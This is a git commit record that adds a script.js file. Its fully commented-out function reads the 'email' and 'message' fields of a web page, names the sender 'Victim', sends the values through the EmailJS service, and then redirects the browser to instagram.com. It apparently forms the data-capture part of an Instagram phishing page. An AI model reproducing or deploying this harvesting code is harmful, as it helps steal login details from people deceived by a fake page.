48ad98ac37c78c298b84ec3dac6f27cf1682f373
Jobayer-Majumder <jobayermojumder70@gmail.com>
2023-05-28 19:14:25 +0600

    js added

---
+++ script.js
@@ -0,0 +1,14 @@
+// script.js
+
+// function SendMail(){
+//     const params = {
+//         from_name: "Victim",
+//         email_id: document.getElementById('email').value,
+//         message: document.getElementById('message').value,
+//     }
+
+//     emailjs.send('service_3ntw76q', 'template_t83k5vp', params).then(function(res) {
+//         alert(res.status)
+//         location.replace('https://www.instagram.com')
+//     })
+// }
